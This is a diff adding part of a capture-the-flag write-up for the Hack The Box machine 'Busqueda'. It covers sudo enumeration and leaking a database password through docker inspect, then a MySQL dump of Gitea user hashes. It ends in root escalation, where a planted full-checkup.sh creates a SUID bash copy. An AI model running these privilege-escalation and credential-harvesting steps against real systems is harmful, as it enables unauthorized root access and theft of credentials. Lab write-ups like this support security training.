@@ -355,3 +355,150 @@ echo "10.10.11.208 gitea.searcher.htb" | sudo tee -a /etc/hosts
 ```
 cody:jh1usoih2bkjaspwe92
 ```
+- we go to gitea.searcher.htb and It is a Gitea instance, and cody’s creds work
+- we see nothing intersting so we continue enumerating
+- Running sudo requests a password: so we present cody password
+```
+svc@busqueda:/var/www/app/.git$ sudo -l
+[sudo] password for svc: 
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+
+```
+- The permissions on this file are such that svc can’t read it, and can’t even execute it
+```
+svc@busqueda:/var/www/app/.git$ ls -l /opt/scripts/system-checkup.py 
+-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
+```
+- Because of the * at the end of the sudo line, I can’t run it without args
+- we run it but no appy output
+```
+svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py 
+Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.
+```
+- we try givig the args any thing
+```
+sudo python3 /opt/scripts/system-checkup.py lk                         
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+
+```
+- There are three functions. docker-ps prints the output of what looks like the docker ps command
+- There are two containers running.
+- docker-inspect wants a format and a container name:
+- If I pass it {{ json [selector]}} then whatever I give in selector will pick what displays. If I just give it . as the selector, it displays everything, which I’ll pipe into jq to pretty print
+```
+svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
+{                                                         
+  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
+  "Created": "2023-01-06T17:26:54.457090149Z",
+  "Path": "/usr/bin/entrypoint",                          
+  "Args": [
+    "/bin/s6-svscan",
+    "/etc/s6"
+  ],  
+...[snip]...
+    "Env": [
+      "USER_UID=115",
+      "USER_GID=121",
+      "GITEA__database__DB_TYPE=mysql",
+      "GITEA__database__HOST=db:3306",
+      "GITEA__database__NAME=gitea",
+      "GITEA__database__USER=gitea",
+      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
+      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+      "USER=git",
+      "GITEA_CUSTOM=/data/gitea"                          
+    ],  
+...[snip]...
+```
+- we see db password
+- The last option is full-checkup, but it just errors
+- get the IP of the database by running the system-checkup.py script on the mysql_db container
+```
+svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
+{
+  "docker_gitea": {
+    "IPAMConfig": null,
+    "Links": null,
+    "Aliases": [
+      "f84a6b33fb5a",
+      "db"
+    ],
+    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
+    "EndpointID": "4d843a366dbaece32f09158e28a9f41d0a94cf2892455102e2800dcc445e9561",
+    "Gateway": "172.19.0.1",
+    "IPAddress": "172.19.0.3",
+    "IPPrefixLen": 16,
+    "IPv6Gateway": "",
+    "GlobalIPv6Address": "",
+    "GlobalIPv6PrefixLen": 0,
+    "MacAddress": "02:42:ac:13:00:03",
+    "DriverOpts": null
+  }
+}
+```
+- connect to the db and we  got coonection with this command
+```
+mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
+```
+- now to the real thing several command to find the user tables
+```
+show databases;
+use gitea
+show tables ; 
+```
+- we see the user table
+```
+mysql>  select name,email,passwd from user;
++---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
+| name          | email                            | passwd                                                                                               |
++---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
+| administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
+| cody          | cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
++---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
+```
+- before i try to crack the hash i try loging in to gitea with the neww passwor foun in docker
+```
+yuiu1hoiu4i5ho1uh
+```
+- and we are logged in
+- Administrator has one private repo named “scripts”:
+- system-checkup.py is in that repo:
+- The script is relatively simple. It has three sections, one of which gets called based on the command given. There is a run_command function that uses subprocess.run to run system commands in a safe way. This is not command injectable
+- docker-ps and docker-inspect both use run_command to run docker ps and docker inspect
+- full-checkup is where it is interesting:
+- trying to run full-checkup.sh from the current directory. It failed before because that file didn’t exist.
+- I can put whatever I want into a full-checkup.sh and it will run as root if I start system-checkup.py full-checkup in the same directory.
+```
+svc@busqueda:/dev/shm$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
+svc@busqueda:/dev/shm$ cat full-checkup.sh 
+#!/bin/bash
+
+cp /bin/bash /tmp/0xdf
+chmod 4777 /tmp/0xdf
+svc@busqueda:/dev/shm$ chmod +x full-checkup.sh 
+```
+- now run system-checkup.py and it reports success:
+```
+svc@busqueda:/dev/shm$ sudo python3 /opt/scripts/system-checkup.py full-checkup
+
+[+] Done!
+```
+- /tmp/0xdf is there, owned by root, and the s bit is on
+- run with -p to not drop privs:
+```
+0xdf-5.1# cat root.txt
+8********************
+0xdf-5.1# whoami
+root
+0xdf-5.1# 
+```
